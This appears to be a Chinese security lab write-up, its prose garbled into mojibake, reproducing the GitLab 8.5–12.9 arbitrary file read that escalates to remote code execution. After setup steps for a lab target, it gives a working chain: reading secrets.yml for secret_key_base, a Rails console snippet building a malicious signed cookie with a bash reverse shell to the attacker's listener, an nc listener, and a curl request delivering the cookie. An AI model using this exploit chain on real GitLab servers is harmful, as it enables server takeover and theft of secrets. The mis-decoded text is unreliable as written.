# 0x01 GitLabç®€ä»‹
GitLab æ˜¯ç”±GitLabInc.å¼€å‘ï¼Œæ˜¯ä¸€ä¸ªç”¨äºä»“åº“ç®¡ç†ç³»ç»Ÿçš„å¼€æºé¡¹ç›®ï¼Œä½¿ç”¨MITè®¸å¯è¯çš„åŸºäºç½‘ç»œçš„Gitä»“åº“ç®¡ç†å·¥å…·ï¼Œä¸”å…·æœ‰wikiå’Œissueè·Ÿè¸ªåŠŸèƒ½ï¼Œä½¿ç”¨Gitä½œä¸ºä»£ç ç®¡ç†å·¥å…·ï¼Œå¹¶åœ¨æ­¤åŸºç¡€ä¸Šæ­å»ºèµ·æ¥çš„webæœåŠ¡ã€‚

# 0x02 æ¼æ´æ¦‚è¿°
åœ¨Gitlab 8.5-12.9ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€å¤„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ï¼Œåœ¨ä¸éœ€è¦ç‰¹æƒçš„çŠ¶æ€ä¸‹ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ï¼Œé€ æˆä¸¥é‡ä¿¡æ¯æ³„éœ²ï¼Œä»è€Œå¯¼è‡´è¿›ä¸€æ­¥è¢«æ”»å‡»çš„é£é™©ã€‚

# 0x03 å½±å“ç‰ˆæœ¬
- GitLab EE >=8.5ï¼Œ<=12.9

- GitLab CE >=8.5ï¼Œ<=12.9

# 0x04 ç¯å¢ƒæ­å»º

```
é¶æœº centos7-1ï¼š192.168.50.167
æœ¬åœ°gitlab centos7-2ï¼š192.168.50.125
æœ¬åœ°gitlab ubuntuï¼š192.168.50.227
ç›‘å¬æœºå™¨ kaliï¼š192.168.50.53
```

## 4.1 ç¯å¢ƒæ­å»º-Centos7

> é¶æœºæµ‹è¯•ç‰ˆæœ¬ä¸º gitlab-12.8.7-ce

1.å®‰è£…ä¾èµ–è½¯ä»¶
```
yum -y install policycoreutils openssh-server openssh-clients postfix
```

2.è®¾ç½®postfixå¼€æœºè‡ªå¯ï¼Œå¹¶å¯åŠ¨ï¼Œpostfixæ”¯æŒgitlabå‘ä¿¡åŠŸèƒ½ï¼ˆå¯¹æ¼æ´ç¯å¢ƒåº”è¯¥ä¸é‡è¦ï¼‰

```
systemctl enable postfix && systemctl start postfix
```

å…³é—­é˜²ç«å¢™

```
systemctl stop firewalld.service
```

3.ä¸‹è½½gitlabå®‰è£…åŒ…ï¼Œç„¶åå®‰è£…

æŸ¥çœ‹å½“å‰gitlabç‰ˆæœ¬å‘½ä»¤ï¼š

```
cat /opt/gitlab/embedded/service/gitlab-rails/VERSION
```

ä¸‹è½½rpmåŒ…å¹¶å®‰è£…:

```
wget --no-check-certificate  https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.8.7-ce.0.el7.x86_64.rpm
rpm -i gitlab-ce-12.8.7-ce.0.el7.x86_64.rpm
```

4.ä¿®æ”¹gitlabé…ç½®æ–‡ä»¶æŒ‡å®šæœåŠ¡å™¨ipå’Œè‡ªå®šä¹‰ç«¯å£

```
vim /etc/gitlab/gitlab.rb
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458230-57311f56-8e6b-45f4-a484-a80d740ca29c.png" /></div>



5.é‡ç½®å¹¶å¯åŠ¨Gitlab

æ‰§è¡Œä»¥ä¸‹å‘½ä»¤
```
gitlab-ctl reconfigure
gitlab-ctl restart
```

æ˜¾ç¤ºæˆåŠŸå¯åŠ¨ä¹‹åï¼Œè®¿é—®ç«¯å£è¿›å…¥Gitlabé¡µé¢ï¼Œæç¤ºä¿®æ”¹rootå¯†ç 

> PS:è‹¥å‡ºç°502é¡µé¢ï¼Œå¤šæ¬¡åˆ·æ–°é¡µé¢å³å¯ï¼Œè¿™æ˜¯ç”±äºGitlabæ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜ï¼ŒæœåŠ¡å™¨å“åº”æ…¢å¯¼è‡´çš„ï¼Œæ¨èè™šæ‹Ÿæœºå†…å­˜è‡³å°‘åˆ†é…4Gã€‚


## 4.2 ç¯å¢ƒæ­å»º-Ubuntu
1.å®‰è£…éœ€è¦çš„åº“å’Œè½¯ä»¶
`sudo apt-get install curl openssh-server ca-certificates postfix` 
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458253-c037967a-1aca-467d-a3f5-49f08a759de3.png" /></div>
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458254-b587ebd8-bb08-4cd5-af71-314904e51823.png" /></div>

2.ä¸‹è½½GitLabçš„åŒ…å¹¶è¿›è¡Œå®‰è£…
```
# ä¸‹è½½å®‰è£…åŒ…
wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/ubuntu/xenial/gitlab-ce_12.1.4-ce.0_amd64.deb/download.deb

# æœ¬åœ°å®‰è£…
dpkg -i gitlab-ce_12.1.4-ce.0_amd64.deb
```

3.é…ç½®GitLab
```
vim /etc/gitlab/gitlab.rb
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458272-7cf864f2-ee18-4888-8422-febb4841da5a.png" /></div>

4.é‡ç½®å¹¶å¯åŠ¨Gitlab
æ‰§è¡Œä»¥ä¸‹å‘½ä»¤
```
gitlab-ctl reconfigure
gitlab-ctl restart
```

# 0x05 æ¼æ´å¤ç° - æ— éœ€ç”¨æˆ·åå’Œå¯†ç 

- ğŸ”— [gitlab_rce.py](https://github.com/dotPY-hax/gitlab_RCE/blob/main/gitlab_rce.py)

## 5.1 ä»»æ„æ–‡ä»¶è¯»å–
```
python3 gitlab_rce.py http://192.168.50.167:8888/ 192.168.50.53
```
<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458300-bd371dd7-45e5-4c6a-b40f-4ca0afc76bb2.png" /></div>

## 5.2 RCE
1ã€é¦–å…ˆè·å–`gitlab secret key base`

åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¸‹è½½`/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`æ–‡ä»¶ï¼Œè·å–`secret_key_base`

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458337-342d9d23-cb4d-4ee4-92a2-9bc1f5af0d8a.png" /></div>

2ã€æœ¬åœ°`centos7-2`æ­å»ºgitlabï¼Œæ›¿æ¢secret_key_baseï¼Œç”Ÿæˆcookie

> ğŸš© Ubuntuå’Œcentos7ä½œä¸ºæœ¬åœ°ç¯å¢ƒï¼Œåç»­å‘½ä»¤æ“ä½œéƒ½ä¸€æ ·

æœ¬åœ°`centos7-2`åˆšæ­å»ºå®Œè¦è®°å¾—æ”¹é…ç½®ï¼Œé‡ç½®å¹¶å¯åŠ¨GitLabã€‚

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458425-e2b8be24-7ca9-4d59-8c0d-add23a4c83fe.png" /></div>

å°†ç›®æ ‡æœºä¸‹è½½ä¸‹æ¥çš„secerts.ymlè¦†ç›–åœ¨centos7-2æ”»å‡»æœºä¸Š/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

ï¼ˆä¹Ÿå¯ä»¥åªæ›¿æ¢secret_key_baseï¼‰

ç„¶å**ä¸è¦**å†é‡ç½®å¹¶å¯åŠ¨Gitlab

3ã€ä½¿ç”¨`gitlab-rails console`æ‰§è¡Œä»¥ä¸‹å‘½ä»¤

ï¼ˆpsï¼šåå¼¹shellçš„å‘½ä»¤å¿…é¡»ä½¿ç”¨bash -c åŒ…è£¹ï¼Œå¦åˆ™åå¼¹ä¸äº†shellï¼›ä½¿ç”¨æ§åˆ¶å°æ‰§è¡Œè¿™äº›è¯­å¥æ—¶ï¼Œç³»ç»Ÿå‘½ä»¤ä¼šåœ¨æœ¬æœºä¼šæ‰§è¡Œä¸€éï¼Œæ‰€ä»¥åœ¨ä»¥ä¸Šè¯­å¥æ‰§è¡Œå®Œæˆè·å–cookieå€¼ä¹‹å‰ï¼Œä¸è¦åœ¨æ”»å‡»æœºä¸Šæ‰§è¡Œç›‘å¬ç«¯å£å‘½ä»¤ï¼‰

```
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/192.168.50.53/7777 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458484-7c287448-cbae-4bec-8038-8e1e15f7d033.png" /></div>

4ã€åœ¨æ”»å‡»æœºä¸Šç›‘å¬ç«¯å£

```
nc -lvvp 7777
```

5ã€æ„é€ è¯­å¥æ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shell
```
curl -v 'http://192.168.50.167:8888/users/sign_in' -b "experimentation_subject_id=cookie"
```

> ï¼ˆpsï¼šæ³¨æ„`experimentation_subject_id`å‚æ•°è¾“å…¥`gitlab-rails console`è·å–çš„cookieå€¼ï¼‰


<div align=center><img src="https://user-images.githubusercontent.com/84888757/174458540-1c4ff2a9-f48a-4c8d-9e2f-a3ef2808826d.png" /></div>


# 0x06 ä¿®å¤å»ºè®®
å®˜æ–¹å·²åœ¨æœ€æ–°ç‰ˆæœ¬çš„GitLabä¿®å¤äº†ä¸Šè¿°æ¼æ´ï¼Œç”¨æˆ·å¯ä»å®˜ç½‘ä¸‹è½½å¹¶å‡çº§è½¯ä»¶åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚

é“¾æ¥ï¼šhttps://packages.gitlab.com/gitlab/gitlab-ce

# 0x07 å‚è€ƒé“¾æ¥
- [Gitlabä»»æ„æ–‡ä»¶è¯»å–å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œ](https://juejin.cn/post/6916343939649765389)
- [Ubuntuå®‰è£…GitLab æŒ‡å—](https://blog.csdn.net/u014380491/article/details/122410481)


